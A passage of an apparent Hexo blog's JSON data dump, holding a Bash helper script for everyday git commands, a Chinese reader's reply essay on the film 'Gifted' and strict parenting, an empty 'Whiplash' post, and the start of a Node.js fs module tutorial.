class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"添加自定义shell\"><a href=\"#添加自定义shell\" class=\"headerlink\" title=\"添加自定义shell\"></a>添加自定义shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bi  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n"},{"title":"天才少女观影感","date":"2018-06-05T05:56:38.000Z","_content":"\n回复：\n\n>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。\n\n>望子成龙 基本上是 每个父母的 `核心价值观之一`。 但是 `方式方法、实现途径` 却是 `各显神通`。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]\n\n>很明显 从博主的文字中，我 `粗浅的` 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]\n\n>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 **`专制` `武断` `不民主` `缺少爱`** 的。当然还有 **`溺爱` `过分的表扬` `没有正确主流价值观的爱`** 等等。。。[这一段想找出 究竟什么是 我们认为的 `坏的教育方式`]\n\n>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 `激发` 被专制者的`认同`或者`反抗心理`。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] \n\n>罗振宇说过 `人类和机器` (人工智能) 认知世界的区别就是 人类是通过把所有`复杂的事情简化`，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 `黑/白  对/错` 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]\n\n>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。\n\n\n>最后说一句，博主文章中有一段说，\n````\n版权归作者所有，任何形式转载请联系作者。\n作者：张天翼（来自豆瓣）\n来源：https://movie.douban.com/review/8524953/\n\n\n这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！\n````\n我觉得 像`图灵`和`乔布斯`这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 `董存瑞` `黄继光` `邱少云`这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好\n\n我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。\n\n如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。\n\n欢迎大家和我探讨。\n","source":"_posts/Movie/天才少女观影感.md","raw":"---\ntitle: 天才少女观影感\ndate: 2018-06-05 13:56:38\ntags:\ncategories:\n---\n\n回复：\n\n>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。\n\n>望子成龙 基本上是 每个父母的 `核心价值观之一`。 但是 `方式方法、实现途径` 却是 `各显神通`。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]\n\n>很明显 从博主的文字中，我 `粗浅的` 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]\n\n>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 **`专制` `武断` `不民主` `缺少爱`** 的。当然还有 **`溺爱` `过分的表扬` `没有正确主流价值观的爱`** 等等。。。[这一段想找出 究竟什么是 我们认为的 `坏的教育方式`]\n\n>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 `激发` 被专制者的`认同`或者`反抗心理`。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] \n\n>罗振宇说过 `人类和机器` (人工智能) 认知世界的区别就是 人类是通过把所有`复杂的事情简化`，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 `黑/白  对/错` 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]\n\n>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。\n\n\n>最后说一句，博主文章中有一段说，\n````\n版权归作者所有，任何形式转载请联系作者。\n作者：张天翼（来自豆瓣）\n来源：https://movie.douban.com/review/8524953/\n\n\n这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！\n````\n我觉得 像`图灵`和`乔布斯`这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 `董存瑞` `黄继光` `邱少云`这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好\n\n我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。\n\n如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。\n\n欢迎大家和我探讨。\n","slug":"Movie/天才少女观影感","published":1,"updated":"2018-06-08T07:46:05.661Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2a20033b8xjoud6h489","content":"<p>回复：</p>\n<blockquote>\n<p>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。</p>\n<p>望子成龙 基本上是 每个父母的 <code>核心价值观之一</code>。 但是 <code>方式方法、实现途径</code> 却是 <code>各显神通</code>。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]</p>\n<p>很明显 从博主的文字中，我 <code>粗浅的</code> 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]</p>\n<p>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 <strong><code>专制</code> <code>武断</code> <code>不民主</code> <code>缺少爱</code></strong> 的。当然还有 <strong><code>溺爱</code> <code>过分的表扬</code> <code>没有正确主流价值观的爱</code></strong> 等等。。。[这一段想找出 究竟什么是 我们认为的 <code>坏的教育方式</code>]</p>\n<p>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 <code>激发</code> 被专制者的<code>认同</code>或者<code>反抗心理</code>。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] </p>\n<p>罗振宇说过 <code>人类和机器</code> (人工智能) 认知世界的区别就是 人类是通过把所有<code>复杂的事情简化</code>，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 <code>黑/白  对/错</code> 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]</p>\n<p>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。</p>\n<p>最后说一句，博主文章中有一段说，<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">版权归作者所有，任何形式转载请联系作者。</span><br><span class=\"line\">作者：张天翼（来自豆瓣）</span><br><span class=\"line\">来源：https://movie.douban.com/review/8524953/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>我觉得 像<code>图灵</code>和<code>乔布斯</code>这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 <code>董存瑞</code> <code>黄继光</code> <code>邱少云</code>这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好</p>\n<p>我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。</p>\n<p>如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。</p>\n<p>欢迎大家和我探讨。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>回复：</p>\n<blockquote>\n<p>你的文章，我读了两遍。其中提到的《摔跤》的论点，还有你的那段 描写自己 努力学正常人走路的文字，引起了我的深思。</p>\n<p>望子成龙 基本上是 每个父母的 <code>核心价值观之一</code>。 但是 <code>方式方法、实现途径</code> 却是 <code>各显神通</code>。 有一些做法 确实得到了大众的认可， 但既然有 被主流接受的做法，那就有 值得批判的做法。[这一段写 对事物进行两面性分析]</p>\n<p>很明显 从博主的文字中，我 <code>粗浅的</code> 觉得博主属于后者 ( 值得批判的做法 ) 。毕竟话说那么绝对，也不是什么好事。我觉得博主的文采还是跟童年经历有些关系的吧。不过，通过博主以上的描述，我还是觉得博主的父亲还是有些不可取的地方的。[这一段主要是 同情博主，其实我也有类似的童年经历]</p>\n<p>从博主描述的自身经历，以及抛出的两个论据来看，不被接受的教育方式大多是 <strong><code>专制</code> <code>武断</code> <code>不民主</code> <code>缺少爱</code></strong> 的。当然还有 <strong><code>溺爱</code> <code>过分的表扬</code> <code>没有正确主流价值观的爱</code></strong> 等等。。。[这一段想找出 究竟什么是 我们认为的 <code>坏的教育方式</code>]</p>\n<p>首先我不反对，专制的父爱。但是专制不代表可以无所谓的伤害。我认为在专制的过程中还要 <code>激发</code> 被专制者的<code>认同</code>或者<code>反抗心理</code>。(好的专制题材的电影会给我们观影者，以及被专制者明白，这么对待他可能是不正确的，可能是一种极端的做法。那么你来反抗，来推翻我的专制。代表作品就是《摔跤》、《爆裂鼓手》) [这一段想表达 就算是不被主流接受的教育方式 也存在很多不同。正是这些不同，造成了 有的人成功，有的人失败。当然成功和失败也只是从某种单一角度来定义的。] </p>\n<p>罗振宇说过 <code>人类和机器</code> (人工智能) 认知世界的区别就是 人类是通过把所有<code>复杂的事情简化</code>，而机器却是把所有简单的事情，复杂化。今天讨论的主体不是人工智能， 所以我想说的是，人类把事情简化的认知世界的方式其实是不完美的，但毕竟我们大脑的认知能力和带宽有限。没办法只能这样 把所有事情 分成 <code>黑/白  对/错</code> 这种简单抽象的 概念，我们并没有能力去注意分辨、辩驳，那会消耗我们大量的时间 与 精力， 就像美国的法律 只会根据 一些定义好的条条框框来判断，你是否是一个合格的父母，这是我们简化认知的结果，但是带来的弊端就是 这种做法不那么准确，或者说完美。 这个世界是多元的。每个人，每种方式，只是类似，并不完全相同。甚至相同的方法，对待不同的人，都会产生不同的效果。就像《摔跤》的方式方法虽然看似粗暴，但影片中的 汉米尔 是 正确 和 不被庸众 所接受的 一个具象化符号。 [这一段 是对上一段 论证的 加强。我们不能用非黑即白的眼光看待这个世界。有些大体上看似 跟 错误的做法类似的行为，不一定就同样是错的。因为它里面的细节，千丝万缕那才是真正需要我们去用理性分析的。]</p>\n<p>有付出就有回报，天才都是高压下的产物。如果想要成就不凡，那必须有付出代价的觉悟。当然很多电影宣传 希望主人公 过普通人的生活，平淡、快乐的一生，也没有错误。每个人生来都有选择自己 生活方式 的权利，不过前提是你有的选。</p>\n<p>最后说一句，博主文章中有一段说，<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">版权归作者所有，任何形式转载请联系作者。</span><br><span class=\"line\">作者：张天翼（来自豆瓣）</span><br><span class=\"line\">来源：https://movie.douban.com/review/8524953/</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这样会耽误了天才的发展吗？会让人类文明晚前进若干年吗？不会！莫言从小找不到书读也成了莫言。再说，人类的文明进程真是靠天才在推进？也许某个时间点上某个天才的某项发现确实推了它一把，但“前进”是历史的必然。有你没你，人类最终都会吃上熟食、用上电灯、开上汽车、连上互联网。也许，也许我们会失去一个莫扎特，但那只是“也许”！</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>我觉得 像<code>图灵</code>和<code>乔布斯</code>这样的人，可能不是唯一能改变世界的人。但是如果世界上像他们这样的人(上面提到的两位大神)都觉得可能会有其他人愿意或者有可能，来改变这个世界，我只需要当个快乐的普通人来享受就好了。我们现在可能真的有可能还在泥地里爬行。。。俗话说天塌了有个子高的人顶着，这句话是最冷漠以及事不关己高高挂起的 话了。就像革命先烈一样，如果没有无数像 <code>董存瑞</code> <code>黄继光</code> <code>邱少云</code>这样的人，我们现在的祖国会是个什么样子祖国。可能我也依然会很幸福，会很爱她吧。不想改变世界，没有承担痛苦的觉悟也就只能做一个普普通通的 普通 人了。这并没有什么不好</p>\n<p>我也是一个爱啰嗦的人，但是前提是有足够新颖和话题能打动我。很明显，和博主类似的童年经历，以及博主精彩的文字 吸引 并且打动了我。一切的想法，都恨幼稚，都是心直口快的产物。都是渴望找到认同的行为。尽量不去使用偏激的语言，避免造成不必要的冲突。</p>\n<p>如果看到我文字的人，觉得啰嗦。每一段 最后的 “[]” 里面有我对当前段落的总结。</p>\n<p>欢迎大家和我探讨。</p>\n"},{"title":"爆裂鼓手·观后感","date":"2018-06-01T05:24:24.000Z","_content":"","source":"_posts/Movie/爆裂鼓手·观后感.md","raw":"---\ntitle: 爆裂鼓手·观后感\ndate: 2018-06-01 13:24:24\ntags: \ncategories: \n---\n","slug":"Movie/爆裂鼓手·观后感","published":1,"updated":"2018-06-08T07:46:13.573Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2a40037b8xjeqkb7crl","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"FS模块","date":"2018-07-05T06:47:46.000Z","_content":"## [Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流](https://blog.csdn.net/houyanhua1/article/details/79443987)\n\n````\n/* \n 1. fs.stat  检测是文件还是目录(目录 文件是否存在) \n 2. fs.mkdir  创建目录 （创建之前先判断是否存在） \n 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) \n 4. fs.appendFile 写入追加文件 \n 5. fs.readFile 读取文件 \n 6. fs.readdir 读取目录 \n 7. fs.rename 重命名 \n 8. fs.rmdir  删除目录 \n 9. fs.unlink 删除文件 \n 10. fs.createReadStream('') 从文件流中读取数据\n 11. fs.createWriteStream  写入文件流\n 12. pipe 管道流 \n 13. fs.access 判断目录、文件是否存在(读写权限)\n*/\n \nvar fs=require('fs');   //fs是node.js的核心模块，不用下载安装，可以直接引入  \n \n//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。\nfs.stat('html',function(error,stats){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('文件：'+stats.isFile());\n    console.log('目录：'+stats.isDirectory());\n})\n \n \n//2. fs.mkdir  创建目录  \nfs.mkdir('css',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('创建目录成功');\n})\n \n \n//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  \nfs.writeFile('123.txt','你好nodejs 覆盖','utf8',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//4. fs.appendFile 追加文件  \nfs.appendFile('123.txt','这是写入的内容\\n',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//5.fs.readFile 读取文件  \nfs.readFile('123.txt',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式\"utf8\"来解决十六进制的问题;\n    console.log(data.toString());  //读取出所有行的信息  \n})\n \n \n//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  \nfs.readdir('html',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  \n})\n \n \n//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  \nfs.rename('html/index.html','html/news.html',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('修改名字成功');\n})\n \n \n//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  \nfs.rmdir('abc目录',function(error){\n    